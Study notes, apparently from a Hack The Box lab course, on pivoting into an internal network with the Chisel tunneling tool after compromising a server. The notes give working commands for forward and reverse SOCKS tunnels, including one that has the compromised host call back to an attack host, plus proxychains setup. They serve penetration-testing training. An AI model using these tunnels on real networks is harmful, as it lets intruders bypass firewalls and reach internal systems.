- [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP based tunneling tool written in Go that uses HTTP to transport data secured using SSH.
	- Can be used to create client-server tunnel connections in firewall restricted environments.
- Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)"
- IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and _shrinking the size of the binary_ at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).

- In this example scenario we to tunnel traffic to a webserver on the `172.16.5.0/23` internal network. There is the Domain Controller at `172.16.5.19`. This is not directly accesible to our attack host. However since we have compromised a server on the internal network we can start Chisel on it so it will listen on a specific port and forward our traffic to the internal network.

## Set Up & Use Chisel
**Note:****  Go must be installed to build the Chisel binary.

#### Cloning Chisel
``` bash
git clone https://github.com/jpillora/chisel.git
```

#### Build the Chisel Binary
``` bash
cd chisel && go build
```

#### Transfer Chisel Binary to Pivot Host
``` bash
scp chisel ubuntu@10.129.202.64:~/
```

#### Run the Chisel Server on the Pivot Host
``` bash
./chisel server -v -p 1234 --socks5
```
- The Chisel listener will listen for incoming connection on port `1234` using SOCKS5 and forward it to all the networks that are accessible from the pivot host.
	- We can now start a client on the attack host and connect to the Chisel server.

``` bash
./chisel client -v 10.129.202.64:1234 socks
```

![[2023-04-12 12_29_51-Hack The Box - Academy.png|600]]
#### Edit and Confirm proxychains.conf
- As seen in the client output above, Chisel has created a tunnel and has starte listening on port `1080`.
- We need to modify `/etc/proxychains.conf` to add port 1080 so that we can use proxychains to pivot using the tunnel.
	- In this case we would add `socks5 127.0.0.1 1080`


## Chisel Reverse Pivot

- In the above example the pivot host is acting as the Chisel server, listening on port 1234. However firewall rules may restrict inbound connections. In that case we can use Chisel with the reverse option.
- When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. 
- Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.

#### Starting the Chisel Server on our Attack Host
``` bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

#### Connect to the Attack host from Pivot Host
``` bash
./chisel client -v 10.10.14.17:1234 R:socks
```

- Again make sure that `/etc/proxychains.conf` is configured for `socks5 127.0.0.1 1080`